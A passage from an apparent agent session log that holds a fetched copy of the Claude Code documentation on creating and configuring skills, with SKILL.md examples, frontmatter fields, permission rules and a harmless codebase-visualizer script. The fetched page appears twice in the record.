Includes custom slash commands.\n\nSkills extend what Claude can do. Create a `SKILL.md` file with instructions, and Claude adds it to its toolkit. Claude uses skills when relevant, or you can invoke one directly with `/skill-name`.\n\n<Note>\n  For built-in commands like `/help` and `/compact`, see [interactive mode](/en/interactive-mode#built-in-commands).\n\n  **Custom slash commands have been merged into skills.** A file at `.claude/commands/review.md` and a skill at `.claude/skills/review/SKILL.md` both create `/review` and work the same way. Your existing `.claude/commands/` files keep working. Skills add optional features: a directory for supporting files, frontmatter to [control whether you or Claude invokes them](#control-who-invokes-a-skill), and the ability for Claude to load them automatically when relevant.\n</Note>\n\nClaude Code skills follow the [Agent Skills](https://agentskills.io) open standard, which works across multiple AI tools. Claude Code extends the standard with additional features like [invocation control](#control-who-invokes-a-skill), [subagent execution](#run-skills-in-a-subagent), and [dynamic context injection](#inject-dynamic-context).\n\n## Getting started\n\n### Create your first skill\n\nThis example creates a skill that teaches Claude to explain code using visual diagrams and analogies. Since it uses default frontmatter, Claude can load it automatically when you ask how something works, or you can invoke it directly with `/explain-code`.\n\n<Steps>\n  <Step title=\"Create the skill directory\">\n    Create a directory for the skill in your personal skills folder. Personal skills are available across all your projects.\n\n    ```bash  theme={null}\n    mkdir -p ~/.claude/skills/explain-code\n    ```\n  </Step>\n\n  <Step title=\"Write SKILL.md\">\n    Every skill needs a `SKILL.md` file with two parts: YAML frontmatter (between `---` markers) that tells Claude when to use the skill, and markdown content with instructions Claude follows when the skill is invoked. The `name` field becomes the `/slash-command`, and the `description` helps Claude decide when to load it automatically.\n\n    Create `~/.claude/skills/explain-code/SKILL.md`:\n\n    ```yaml  theme={null}\n    ---\n    name: explain-code\n    description: Explains code with visual diagrams and analogies. Use when explaining how code works, teaching about a codebase, or when the user asks \"how does this work?\"\n    ---\n\n    When explaining code, always include:\n\n    1. **Start with an analogy**: Compare the code to something from everyday life\n    2. **Draw a diagram**: Use ASCII art to show the flow, structure, or relationships\n    3. **Walk through the code**: Explain step-by-step what happens\n    4. **Highlight a gotcha**: What's a common mistake or misconception?\n\n    Keep explanations conversational. For complex concepts, use multiple analogies.\n    ```\n  </Step>\n\n  <Step title=\"Test the skill\">\n    You can test it two ways:\n\n    **Let Claude invoke it automatically** by asking something that matches the description:\n\n    ```\n    How does this code work?\n    ```\n\n    **Or invoke it directly** with the skill name:\n\n    ```\n    /explain-code src/auth/login.ts\n    ```\n\n    Either way, Claude should include an analogy and ASCII diagram in its explanation.\n  </Step>\n</Steps>\n\n### Where skills live\n\nWhere you store a skill determines who can use it:\n\n| Location   | Path                                                     | Applies to                     |\n| :--------- | :------------------------------------------------------- | :----------------------------- |\n| Enterprise | See [managed settings](/en/permissions#managed-settings) | All users in your organization |\n| Personal   | `~/.claude/skills/<skill-name>/SKILL.md`                 | All your projects              |\n| Project    | `.claude/skills/<skill-name>/SKILL.md`                   | This project only              |\n| Plugin     | `<plugin>/skills/<skill-name>/SKILL.md`                  | Where plugin is enabled        |\n\nWhen skills share the same name across levels, higher-priority locations win: enterprise > personal > project. Plugin skills use a `plugin-name:skill-name` namespace, so they cannot conflict with other levels. If you have files in `.claude/commands/`, those work the same way, but if a skill and a command share the same name, the skill takes precedence.\n\n#### Automatic discovery from nested directories\n\nWhen you work with files in subdirectories, Claude Code automatically discovers skills from nested `.claude/skills/` directories. For example, if you're editing a file in `packages/frontend/`, Claude Code also looks for skills in `packages/frontend/.claude/skills/`. This supports monorepo setups where packages have their own skills.\n\nEach skill is a directory with `SKILL.md` as the entrypoint:\n\n```\nmy-skill/\n├── SKILL.md           # Main instructions (required)\n├── template.md        # Template for Claude to fill in\n├── examples/\n│   └── sample.md      # Example output showing expected format\n└── scripts/\n    └── validate.sh    # Script Claude can execute\n```\n\nThe `SKILL.md` contains the main instructions and is required. Other files are optional and let you build more powerful skills: templates for Claude to fill in, example outputs showing the expected format, scripts Claude can execute, or detailed reference documentation. Reference these files from your `SKILL.md` so Claude knows what they contain and when to load them. See [Add supporting files](#add-supporting-files) for more details.\n\n<Note>\n  Files in `.claude/commands/` still work and support the same [frontmatter](#frontmatter-reference). Skills are recommended since they support additional features like supporting files.\n</Note>\n\n#### Skills from additional directories\n\nSkills defined in `.claude/skills/` within directories added via `--add-dir` are loaded automatically and picked up by live change detection, so you can edit them during a session without restarting.\n\n<Note>\n  CLAUDE.md files from `--add-dir` directories are not loaded by default. To load them, set `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1`. See [Load memory from additional directories](/en/memory#load-memory-from-additional-directories).\n</Note>\n\n## Configure skills\n\nSkills are configured through YAML frontmatter at the top of `SKILL.md` and the markdown content that follows.\n\n### Types of skill content\n\nSkill files can contain any instructions, but thinking about how you want to invoke them helps guide what to include:\n\n**Reference content** adds knowledge Claude applies to your current work. Conventions, patterns, style guides, domain knowledge. This content runs inline so Claude can use it alongside your conversation context.\n\n```yaml  theme={null}\n---\nname: api-conventions\ndescription: API design patterns for this codebase\n---\n\nWhen writing API endpoints:\n- Use RESTful naming conventions\n- Return consistent error formats\n- Include request validation\n```\n\n**Task content** gives Claude step-by-step instructions for a specific action, like deployments, commits, or code generation. These are often actions you want to invoke directly with `/skill-name` rather than letting Claude decide when to run them. Add `disable-model-invocation: true` to prevent Claude from triggering it automatically.\n\n```yaml  theme={null}\n---\nname: deploy\ndescription: Deploy the application to production\ncontext: fork\ndisable-model-invocation: true\n---\n\nDeploy the application:\n1. Run the test suite\n2. Build the application\n3. Push to the deployment target\n```\n\nYour `SKILL.md` can contain anything, but thinking through how you want the skill invoked (by you, by Claude, or both) and where you want it to run (inline or in a subagent) helps guide what to include. For complex skills, you can also [add supporting files](#add-supporting-files) to keep the main skill focused.\n\n### Frontmatter reference\n\nBeyond the markdown content, you can configure skill behavior using YAML frontmatter fields between `---` markers at the top of your `SKILL.md` file:\n\n```yaml  theme={null}\n---\nname: my-skill\ndescription: What this skill does\ndisable-model-invocation: true\nallowed-tools: Read, Grep\n---\n\nYour skill instructions here...\n```\n\nAll fields are optional. Only `description` is recommended so Claude knows when to use the skill.\n\n| Field                      | Required    | Description                                                                                                                                           |\n| :------------------------- | :---------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `name`                     | No          | Display name for the skill. If omitted, uses the directory name. Lowercase letters, numbers, and hyphens only (max 64 characters).                    |\n| `description`              | Recommended | What the skill does and when to use it. Claude uses this to decide when to apply the skill. If omitted, uses the first paragraph of markdown content. |\n| `argument-hint`            | No          | Hint shown during autocomplete to indicate expected arguments. Example: `[issue-number]` or `[filename] [format]`.                                    |\n| `disable-model-invocation` | No          | Set to `true` to prevent Claude from automatically loading this skill. Use for workflows you want to trigger manually with `/name`. Default: `false`. |\n| `user-invocable`           | No          | Set to `false` to hide from the `/` menu. Use for background knowledge users shouldn't invoke directly. Default: `true`.                              |\n| `allowed-tools`            | No          | Tools Claude can use without asking permission when this skill is active.                                                                             |\n| `model`                    | No          | Model to use when this skill is active.                                                                                                               |\n| `context`                  | No          | Set to `fork` to run in a forked subagent context.                                                                                                    |\n| `agent`                    | No          | Which subagent type to use when `context: fork` is set.                                                                                               |\n| `hooks`                    | No          | Hooks scoped to this skill's lifecycle. See [Hooks in skills and agents](/en/hooks#hooks-in-skills-and-agents) for configuration format.              |\n\n#### Available string substitutions\n\nSkills support string substitution for dynamic values in the skill content:\n\n| Variable               | Description                                                                                                                                  |\n| :--------------------- | :------------------------------------------------------------------------------------------------------------------------------------------- |\n| `$ARGUMENTS`           | All arguments passed when invoking the skill. If `$ARGUMENTS` is not present in the content, arguments are appended as `ARGUMENTS: <value>`. |\n| `$ARGUMENTS[N]`        | Access a specific argument by 0-based index, such as `$ARGUMENTS[0]` for the first argument.                                                 |\n| `$N`                   | Shorthand for `$ARGUMENTS[N]`, such as `$0` for the first argument or `$1` for the second.                                                   |\n| `${CLAUDE_SESSION_ID}` | The current session ID. Useful for logging, creating session-specific files, or correlating skill output with sessions.                      |\n\n**Example using substitutions:**\n\n```yaml  theme={null}\n---\nname: session-logger\ndescription: Log activity for this session\n---\n\nLog the following to logs/${CLAUDE_SESSION_ID}.log:\n\n$ARGUMENTS\n```\n\n### Add supporting files\n\nSkills can include multiple files in their directory. This keeps `SKILL.md` focused on the essentials while letting Claude access detailed reference material only when needed. Large reference docs, API specifications, or example collections don't need to load into context every time the skill runs.\n\n```\nmy-skill/\n├── SKILL.md (required - overview and navigation)\n├── reference.md (detailed API docs - loaded when needed)\n├── examples.md (usage examples - loaded when needed)\n└── scripts/\n    └── helper.py (utility script - executed, not loaded)\n```\n\nReference supporting files from `SKILL.md` so Claude knows what each file contains and when to load it:\n\n```markdown  theme={null}\n## Additional resources\n\n- For complete API details, see [reference.md](reference.md)\n- For usage examples, see [examples.md](examples.md)\n```\n\n<Tip>Keep `SKILL.md` under 500 lines. Move detailed reference material to separate files.</Tip>\n\n### Control who invokes a skill\n\nBy default, both you and Claude can invoke any skill. You can type `/skill-name` to invoke it directly, and Claude can load it automatically when relevant to your conversation. Two frontmatter fields let you restrict this:\n\n* **`disable-model-invocation: true`**: Only you can invoke the skill. Use this for workflows with side effects or that you want to control timing, like `/commit`, `/deploy`, or `/send-slack-message`. You don't want Claude deciding to deploy because your code looks ready.\n\n* **`user-invocable: false`**: Only Claude can invoke the skill. Use this for background knowledge that isn't actionable as a command. A `legacy-system-context` skill explains how an old system works. Claude should know this when relevant, but `/legacy-system-context` isn't a meaningful action for users to take.\n\nThis example creates a deploy skill that only you can trigger. The `disable-model-invocation: true` field prevents Claude from running it automatically:\n\n```yaml  theme={null}\n---\nname: deploy\ndescription: Deploy the application to production\ndisable-model-invocation: true\n---\n\nDeploy $ARGUMENTS to production:\n\n1. Run the test suite\n2. Build the application\n3. Push to the deployment target\n4. Verify the deployment succeeded\n```\n\nHere's how the two fields affect invocation and context loading:\n\n| Frontmatter                      | You can invoke | Claude can invoke | When loaded into context                                     |\n| :------------------------------- | :------------- | :---------------- | :----------------------------------------------------------- |\n| (default)                        | Yes            | Yes               | Description always in context, full skill loads when invoked |\n| `disable-model-invocation: true` | Yes            | No                | Description not in context, full skill loads when you invoke |\n| `user-invocable: false`          | No             | Yes               | Description always in context, full skill loads when invoked |\n\n<Note>\n  In a regular session, skill descriptions are loaded into context so Claude knows what's available, but full skill content only loads when invoked. [Subagents with preloaded skills](/en/sub-agents#preload-skills-into-subagents) work differently: the full skill content is injected at startup.\n</Note>\n\n### Restrict tool access\n\nUse the `allowed-tools` field to limit which tools Claude can use when a skill is active. This skill creates a read-only mode where Claude can explore files but not modify them:\n\n```yaml  theme={null}\n---\nname: safe-reader\ndescription: Read files without making changes\nallowed-tools: Read, Grep, Glob\n---\n```\n\n### Pass arguments to skills\n\nBoth you and Claude can pass arguments when invoking a skill. Arguments are available via the `$ARGUMENTS` placeholder.\n\nThis skill fixes a GitHub issue by number. The `$ARGUMENTS` placeholder gets replaced with whatever follows the skill name:\n\n```yaml  theme={null}\n---\nname: fix-issue\ndescription: Fix a GitHub issue\ndisable-model-invocation: true\n---\n\nFix GitHub issue $ARGUMENTS following our coding standards.\n\n1. Read the issue description\n2. Understand the requirements\n3. Implement the fix\n4. Write tests\n5. Create a commit\n```\n\nWhen you run `/fix-issue 123`, Claude receives \"Fix GitHub issue 123 following our coding standards...\"\n\nIf you invoke a skill with arguments but the skill doesn't include `$ARGUMENTS`, Claude Code appends `ARGUMENTS: <your input>` to the end of the skill content so Claude still sees what you typed.\n\nTo access individual arguments by position, use `$ARGUMENTS[N]` or the shorter `$N`:\n\n```yaml  theme={null}\n---\nname: migrate-component\ndescription: Migrate a component from one framework to another\n---\n\nMigrate the $ARGUMENTS[0] component from $ARGUMENTS[1] to $ARGUMENTS[2].\nPreserve all existing behavior and tests.\n```\n\nRunning `/migrate-component SearchBar React Vue` replaces `$ARGUMENTS[0]` with `SearchBar`, `$ARGUMENTS[1]` with `React`, and `$ARGUMENTS[2]` with `Vue`. The same skill using the `$N` shorthand:\n\n```yaml  theme={null}\n---\nname: migrate-component\ndescription: Migrate a component from one framework to another\n---\n\nMigrate the $0 component from $1 to $2.\nPreserve all existing behavior and tests.\n```\n\n## Advanced patterns\n\n### Inject dynamic context\n\nThe `!`command\\`\\` syntax runs shell commands before the skill content is sent to Claude. The command output replaces the placeholder, so Claude receives actual data, not the command itself.\n\nThis skill summarizes a pull request by fetching live PR data with the GitHub CLI. The `!`gh pr diff\\`\\` and other commands run first, and their output gets inserted into the prompt:\n\n```yaml  theme={null}\n---\nname: pr-summary\ndescription: Summarize changes in a pull request\ncontext: fork\nagent: Explore\nallowed-tools: Bash(gh *)\n---\n\n## Pull request context\n- PR diff: !`gh pr diff`\n- PR comments: !`gh pr view --comments`\n- Changed files: !`gh pr diff --name-only`\n\n## Your task\nSummarize this pull request...\n```\n\nWhen this skill runs:\n\n1. Each `!`command\\`\\` executes immediately (before Claude sees anything)\n2. The output replaces the placeholder in the skill content\n3. Claude receives the fully-rendered prompt with actual PR data\n\nThis is preprocessing, not something Claude executes. Claude only sees the final result.\n\n<Tip>\n  To enable [extended thinking](/en/common-workflows#use-extended-thinking-thinking-mode) in a skill, include the word \"ultrathink\" anywhere in your skill content.\n</Tip>\n\n### Run skills in a subagent\n\nAdd `context: fork` to your frontmatter when you want a skill to run in isolation. The skill content becomes the prompt that drives the subagent. It won't have access to your conversation history.\n\n<Warning>\n  `context: fork` only makes sense for skills with explicit instructions. If your skill contains guidelines like \"use these API conventions\" without a task, the subagent receives the guidelines but no actionable prompt, and returns without meaningful output.\n</Warning>\n\nSkills and [subagents](/en/sub-agents) work together in two directions:\n\n| Approach                     | System prompt                             | Task                        | Also loads                   |\n| :--------------------------- | :---------------------------------------- | :-------------------------- | :--------------------------- |\n| Skill with `context: fork`   | From agent type (`Explore`, `Plan`, etc.) | SKILL.md content            | CLAUDE.md                    |\n| Subagent with `skills` field | Subagent's markdown body                  | Claude's delegation message | Preloaded skills + CLAUDE.md |\n\nWith `context: fork`, you write the task in your skill and pick an agent type to execute it. For the inverse (defining a custom subagent that uses skills as reference material), see [Subagents](/en/sub-agents#preload-skills-into-subagents).\n\n#### Example: Research skill using Explore agent\n\nThis skill runs research in a forked Explore agent. The skill content becomes the task, and the agent provides read-only tools optimized for codebase exploration:\n\n```yaml  theme={null}\n---\nname: deep-research\ndescription: Research a topic thoroughly\ncontext: fork\nagent: Explore\n---\n\nResearch $ARGUMENTS thoroughly:\n\n1. Find relevant files using Glob and Grep\n2. Read and analyze the code\n3. Summarize findings with specific file references\n```\n\nWhen this skill runs:\n\n1. A new isolated context is created\n2. The subagent receives the skill content as its prompt (\"Research \\$ARGUMENTS thoroughly...\")\n3. The `agent` field determines the execution environment (model, tools, and permissions)\n4. Results are summarized and returned to your main conversation\n\nThe `agent` field specifies which subagent configuration to use. Options include built-in agents (`Explore`, `Plan`, `general-purpose`) or any custom subagent from `.claude/agents/`. If omitted, uses `general-purpose`.\n\n### Restrict Claude's skill access\n\nBy default, Claude can invoke any skill that doesn't have `disable-model-invocation: true` set. Skills that define `allowed-tools` grant Claude access to those tools without per-use approval when the skill is active. Your [permission settings](/en/permissions) still govern baseline approval behavior for all other tools. Built-in commands like `/compact` and `/init` are not available through the Skill tool.\n\nThree ways to control which skills Claude can invoke:\n\n**Disable all skills** by denying the Skill tool in `/permissions`:\n\n```\n# Add to deny rules:\nSkill\n```\n\n**Allow or deny specific skills** using [permission rules](/en/permissions):\n\n```\n# Allow only specific skills\nSkill(commit)\nSkill(review-pr *)\n\n# Deny specific skills\nSkill(deploy *)\n```\n\nPermission syntax: `Skill(name)` for exact match, `Skill(name *)` for prefix match with any arguments.\n\n**Hide individual skills** by adding `disable-model-invocation: true` to their frontmatter. This removes the skill from Claude's context entirely.\n\n<Note>\n  The `user-invocable` field only controls menu visibility, not Skill tool access. Use `disable-model-invocation: true` to block programmatic invocation.\n</Note>\n\n## Share skills\n\nSkills can be distributed at different scopes depending on your audience:\n\n* **Project skills**: Commit `.claude/skills/` to version control\n* **Plugins**: Create a `skills/` directory in your [plugin](/en/plugins)\n* **Managed**: Deploy organization-wide through [managed settings](/en/permissions#managed-settings)\n\n### Generate visual output\n\nSkills can bundle and run scripts in any language, giving Claude capabilities beyond what's possible in a single prompt. One powerful pattern is generating visual output: interactive HTML files that open in your browser for exploring data, debugging, or creating reports.\n\nThis example creates a codebase explorer: an interactive tree view where you can expand and collapse directories, see file sizes at a glance, and identify file types by color.\n\nCreate the Skill directory:\n\n```bash  theme={null}\nmkdir -p ~/.claude/skills/codebase-visualizer/scripts\n```\n\nCreate `~/.claude/skills/codebase-visualizer/SKILL.md`. The description tells Claude when to activate this Skill, and the instructions tell Claude to run the bundled script:\n\n````yaml  theme={null}\n---\nname: codebase-visualizer\ndescription: Generate an interactive collapsible tree visualization of your codebase. Use when exploring a new repo, understanding project structure, or identifying large files.\nallowed-tools: Bash(python *)\n---\n\n# Codebase Visualizer\n\nGenerate an interactive HTML tree view that shows your project's file structure with collapsible directories.\n\n## Usage\n\nRun the visualization script from your project root:\n\n```bash\npython ~/.claude/skills/codebase-visualizer/scripts/visualize.py .\n```\n\nThis creates `codebase-map.html` in the current directory and opens it in your default browser.\n\n## What the visualization shows\n\n- **Collapsible directories**: Click folders to expand/collapse\n- **File sizes**: Displayed next to each file\n- **Colors**: Different colors for different file types\n- **Directory totals**: Shows aggregate size of each folder\n````\n\nCreate `~/.claude/skills/codebase-visualizer/scripts/visualize.py`. This script scans a directory tree and generates a self-contained HTML file with:\n\n* A **summary sidebar** showing file count, directory count, total size, and number of file types\n* A **bar chart** breaking down the codebase by file type (top 8 by size)\n* A **collapsible tree** where you can expand and collapse directories, with color-coded file type indicators\n\nThe script requires Python but uses only built-in libraries, so there are no packages to install:\n\n```python expandable theme={null}\n#!/usr/bin/env python3\n\"\"\"Generate an interactive collapsible tree visualization of a codebase.\"\"\"\n\nimport json\nimport sys\nimport webbrowser\nfrom pathlib import Path\nfrom collections import Counter\n\nIGNORE = {'.git', 'node_modules', '__pycache__', '.venv', 'venv', 'dist', 'build'}\n\ndef scan(path: Path, stats: dict) -> dict:\n    result = {\"name\": path.name, \"children\": [], \"size\": 0}\n    try:\n        for item in sorted(path.iterdir()):\n            if item.name in IGNORE or item.name.startswith('.'):\n                continue\n            if item.is_file():\n                size = item.stat().st_size\n                ext = item.suffix.lower() or '(no ext)'\n                result[\"children\"].append({\"name\": item.name, \"size\": size, \"ext\": ext})\n                result[\"size\"] += size\n                stats[\"files\"] += 1\n                stats[\"extensions\"][ext] += 1\n                stats[\"ext_sizes\"][ext] += size\n            elif item.is_dir():\n                stats[\"dirs\"] += 1\n                child = scan(item, stats)\n                if child[\"children\"]:\n                    result[\"children\"].append(child)\n                    result[\"size\"] += child[\"size\"]\n    except PermissionError:\n        pass\n    return result\n\ndef generate_html(data: dict, stats: dict, output: Path) -> None:\n    ext_sizes = stats[\"ext_sizes\"]\n    total_size = sum(ext_sizes.values()) or 1\n    sorted_exts = sorted(ext_sizes.items(), key=lambda x: -x[1])[:8]\n    colors = {\n        '.js': '#f7df1e', '.ts': '#3178c6', '.py': '#3776ab', '.go': '#00add8',\n        '.rs': '#dea584', '.rb': '#cc342d', '.css': '#264de4', '.html': '#e34c26',\n        '.json': '#6b7280', '.md': '#083fa1', '.yaml': '#cb171e', '.yml': '#cb171e',\n        '.mdx': '#083fa1', '.tsx': '#3178c6', '.jsx': '#61dafb', '.sh': '#4eaa25',\n    }\n    lang_bars = \"\".join(\n        f'<div class=\"bar-row\"><span class=\"bar-label\">{ext}</span>'\n        f'<div class=\"bar\" style=\"width:{(size/total_size)*100}%;background:{colors.get(ext,\"#6b7280\")}\"></div>'\n        f'<span class=\"bar-pct\">{(size/total_size)*100:.1f}%</span></div>'\n        for ext, size in sorted_exts\n    )\n    def fmt(b):\n        if b < 1024: return f\"{b} B\"\n        if b < 1048576: return f\"{b/1024:.1f} KB\"\n        return f\"{b/1048576:.1f} MB\"\n\n    html = f'''<!DOCTYPE html>\n<html><head>\n  <meta charset=\"utf-8\"><title>Codebase Explorer</title>\n  <style>\n    body {{ font: 14px/1.5 system-ui, sans-serif;

The bundled script does the heavy lifting while Claude handles orchestration.\n\n## Troubleshooting\n\n### Skill not triggering\n\nIf Claude doesn't use your skill when expected:\n\n1. Check the description includes keywords users would naturally say\n2. Verify the skill appears in `What skills are available?`\n3. Try rephrasing your request to match the description more closely\n4. Invoke it directly with `/skill-name` if the skill is user-invocable\n\n### Skill triggers too often\n\nIf Claude uses your skill when you don't want it:\n\n1. Make the description more specific\n2. Add `disable-model-invocation: true` if you only want manual invocation\n\n### Claude doesn't see all my skills\n\nSkill descriptions are loaded into context so Claude knows what's available. If you have many skills, they may exceed the character budget. The budget scales dynamically at 2% of the context window, with a fallback of 16,000 characters. Run `/context` to check for a warning about excluded skills.\n\nTo override the limit, set the `SLASH_COMMAND_TOOL_CHAR_BUDGET` environment variable.\n\n## Related resources\n\n* **[Subagents](/en/sub-agents)**: delegate tasks to specialized agents\n* **[Plugins](/en/plugins)**: package and distribute skills with other extensions\n* **[Hooks](/en/hooks)**: automate workflows around tool events\n* **[Memory](/en/memory)**: manage CLAUDE.md files for persistent context\n* **[Interactive mode](/en/interactive-mode#built-in-commands)**: built-in commands and shortcuts\n* **[Permissions](/en/permissions)**: control tool and skill access\n"}]},"uuid":"f94ed012-7717-48bd-9f43-54e6f2b9818c","timestamp":"2026-02-15T12:48:54.965Z","toolUseResult":{"bytes":33067,"code":200,"codeText":"OK","result":"> ## Documentation Index\n> Fetch the complete documentation index at: https://code.claude.com/docs/llms.txt\n> Use this file to discover all available pages before exploring further.\n\n# Extend Claude with skills\n\n> Create, manage, and share skills to extend Claude's capabilities in Claude Code. Includes custom slash commands.\n\nSkills extend what Claude can do. Create a `SKILL.md` file with instructions, and Claude adds it to its toolkit. Claude uses skills when relevant, or you can invoke one directly with `/skill-name`.\n\n<Note>\n  For built-in commands like `/help` and `/compact`, see [interactive mode](/en/interactive-mode#built-in-commands).\n\n  **Custom slash commands have been merged into skills.** A file at `.claude/commands/review.md` and a skill at `.claude/skills/review/SKILL.md` both create `/review` and work the same way. Your existing `.claude/commands/` files keep working. Skills add optional features: a directory for supporting files, frontmatter to [control whether you or Claude invokes them](#control-who-invokes-a-skill), and the ability for Claude to load them automatically when relevant.\n</Note>\n\nClaude Code skills follow the [Agent Skills](https://agentskills.io) open standard, which works across multiple AI tools. Claude Code extends the standard with additional features like [invocation control](#control-who-invokes-a-skill), [subagent execution](#run-skills-in-a-subagent), and [dynamic context injection](#inject-dynamic-context).\n\n## Getting started\n\n### Create your first skill\n\nThis example creates a skill that teaches Claude to explain code using visual diagrams and analogies. Since it uses default frontmatter, Claude can load it automatically when you ask how something works, or you can invoke it directly with `/explain-code`.\n\n<Steps>\n  <Step title=\"Create the skill directory\">\n    Create a directory for the skill in your personal skills folder. Personal skills are available across all your projects.\n\n    ```bash  theme={null}\n    mkdir -p ~/.claude/skills/explain-code\n    ```\n  </Step>\n\n  <Step title=\"Write SKILL.md\">\n    Every skill needs a `SKILL.md` file with two parts: YAML frontmatter (between `---` markers) that tells Claude when to use the skill, and markdown content with instructions Claude follows when the skill is invoked. The `name` field becomes the `/slash-command`, and the `description` helps Claude decide when to load it automatically.\n\n    Create `~/.claude/skills/explain-code/SKILL.md`:\n\n    ```yaml  theme={null}\n    ---\n    name: explain-code\n    description: Explains code with visual diagrams and analogies. Use when explaining how code works, teaching about a codebase, or when the user asks \"how does this work?\"\n    ---\n\n    When explaining code, always include:\n\n    1. **Start with an analogy**: Compare the code to something from everyday life\n    2. **Draw a diagram**: Use ASCII art to show the flow, structure, or relationships\n    3. **Walk through the code**: Explain step-by-step what happens\n    4. **Highlight a gotcha**: What's a common mistake or misconception?\n\n    Keep explanations conversational. For complex concepts, use multiple analogies.\n    ```\n  </Step>\n\n  <Step title=\"Test the skill\">\n    You can test it two ways:\n\n    **Let Claude invoke it automatically** by asking something that matches the description:\n\n    ```\n    How does this code work?\n    ```\n\n    **Or invoke it directly** with the skill name:\n\n    ```\n    /explain-code src/auth/login.ts\n    ```\n\n    Either way, Claude should include an analogy and ASCII diagram in its explanation.\n  </Step>\n</Steps>\n\n### Where skills live\n\nWhere you store a skill determines who can use it:\n\n| Location   | Path                                                     | Applies to                     |\n| :--------- | :------------------------------------------------------- | :----------------------------- |\n| Enterprise | See [managed settings](/en/permissions#managed-settings) | All users in your organization |\n| Personal   | `~/.claude/skills/<skill-name>/SKILL.md`                 | All your projects              |\n| Project    | `.claude/skills/<skill-name>/SKILL.md`                   | This project only              |\n| Plugin     | `<plugin>/skills/<skill-name>/SKILL.md`                  | Where plugin is enabled        |\n\nWhen skills share the same name across levels, higher-priority locations win: enterprise > personal > project. Plugin skills use a `plugin-name:skill-name` namespace, so they cannot conflict with other levels. If you have files in `.claude/commands/`, those work the same way, but if a skill and a command share the same name, the skill takes precedence.\n\n#### Automatic discovery from nested directories\n\nWhen you work with files in subdirectories, Claude Code automatically discovers skills from nested `.claude/skills/` directories. For example, if you're editing a file in `packages/frontend/`, Claude Code also looks for skills in `packages/frontend/.claude/skills/`. This supports monorepo setups where packages have their own skills.\n\nEach skill is a directory with `SKILL.md` as the entrypoint:\n\n```\nmy-skill/\n├── SKILL.md           # Main instructions (required)\n├── template.md        # Template for Claude to fill in\n├── examples/\n│   └── sample.md      # Example output showing expected format\n└── scripts/\n    └── validate.sh    # Script Claude can execute\n```\n\nThe `SKILL.md` contains the main instructions and is required. Other files are optional and let you build more powerful skills: templates for Claude to fill in, example outputs showing the expected format, scripts Claude can execute, or detailed reference documentation. Reference these files from your `SKILL.md` so Claude knows what they contain and when to load them. See [Add supporting files](#add-supporting-files) for more details.\n\n<Note>\n  Files in `.claude/commands/` still work and support the same [frontmatter](#frontmatter-reference). Skills are recommended since they support additional features like supporting files.\n</Note>\n\n#### Skills from additional directories\n\nSkills defined in `.claude/skills/` within directories added via `--add-dir` are loaded automatically and picked up by live change detection, so you can edit them during a session without restarting.\n\n<Note>\n  CLAUDE.md files from `--add-dir` directories are not loaded by default. To load them, set `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1`. See [Load memory from additional directories](/en/memory#load-memory-from-additional-directories).\n</Note>\n\n## Configure skills\n\nSkills are configured through YAML frontmatter at the top of `SKILL.md` and the markdown content that follows.\n\n### Types of skill content\n\nSkill files can contain any instructions, but thinking about how you want to invoke them helps guide what to include:\n\n**Reference content** adds knowledge Claude applies to your current work. Conventions, patterns, style guides, domain knowledge. This content runs inline so Claude can use it alongside your conversation context.\n\n```yaml  theme={null}\n---\nname: api-conventions\ndescription: API design patterns for this codebase\n---\n\nWhen writing API endpoints:\n- Use RESTful naming conventions\n- Return consistent error formats\n- Include request validation\n```\n\n**Task content** gives Claude step-by-step instructions for a specific action, like deployments, commits, or code generation. These are often actions you want to invoke directly with `/skill-name` rather than letting Claude decide when to run them. Add `disable-model-invocation: true` to prevent Claude from triggering it automatically.\n\n```yaml  theme={null}\n---\nname: deploy\ndescription: Deploy the application to production\ncontext: fork\ndisable-model-invocation: true\n---\n\nDeploy the application:\n1. Run the test suite\n2. Build the application\n3. Push to the deployment target\n```\n\nYour `SKILL.md` can contain anything, but thinking through how you want the skill invoked (by you, by Claude, or both) and where you want it to run (inline or in a subagent) helps guide what to include. For complex skills, you can also [add supporting files](#add-supporting-files) to keep the main skill focused.\n\n### Frontmatter reference\n\nBeyond the markdown content, you can configure skill behavior using YAML frontmatter fields between `---` markers at the top of your `SKILL.md` file:\n\n```yaml  theme={null}\n---\nname: my-skill\ndescription: What this skill does\ndisable-model-invocation: true\nallowed-tools: Read, Grep\n---\n\nYour skill instructions here...\n```\n\nAll fields are optional. Only `description` is recommended so Claude knows when to use the skill.\n\n| Field                      | Required    | Description                                                                                                                                           |\n| :------------------------- | :---------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `name`                     | No          | Display name for the skill. If omitted, uses the directory name. Lowercase letters, numbers, and hyphens only (max 64 characters).                    |\n| `description`              | Recommended | What the skill does and when to use it. Claude uses this to decide when to apply the skill. If omitted, uses the first paragraph of markdown content. |\n| `argument-hint`            | No          | Hint shown during autocomplete to indicate expected arguments. Example: `[issue-number]` or `[filename] [format]`.                                    |\n| `disable-model-invocation` | No          | Set to `true` to prevent Claude from automatically loading this skill. Use for workflows you want to trigger manually with `/name`. Default: `false`. |\n| `user-invocable`           | No          | Set to `false` to hide from the `/` menu. Use for background knowledge users shouldn't invoke directly. Default: `true`.                              |\n| `allowed-tools`            | No          | Tools Claude can use without asking permission when this skill is active.                                                                             |\n| `model`                    | No          | Model to use when this skill is active.                                                                                                               |\n| `context`                  | No          | Set to `fork` to run in a forked subagent context.                                                                                                    |\n| `agent`                    | No          | Which subagent type to use when `context: fork` is set.                                                                                               |\n| `hooks`                    | No          | Hooks scoped to this skill's lifecycle. See [Hooks in skills and agents](/en/hooks#hooks-in-skills-and-agents) for configuration format.              |\n\n#### Available string substitutions\n\nSkills support string substitution for dynamic values in the skill content:\n\n| Variable               | Description                                                                                                                                  |\n| :--------------------- | :------------------------------------------------------------------------------------------------------------------------------------------- |\n| `$ARGUMENTS`           | All arguments passed when invoking the skill. If `$ARGUMENTS` is not present in the content, arguments are appended as `ARGUMENTS: <value>`. |\n| `$ARGUMENTS[N]`        | Access a specific argument by 0-based index, such as `$ARGUMENTS[0]` for the first argument.                                                 |\n| `$N`                   | Shorthand for `$ARGUMENTS[N]`, such as `$0` for the first argument or `$1` for the second.                                                   |\n| `${CLAUDE_SESSION_ID}` | The current session ID. Useful for logging, creating session-specific files, or correlating skill output with sessions.                      |\n\n**Example using substitutions:**\n\n```yaml  theme={null}\n---\nname: session-logger\ndescription: Log activity for this 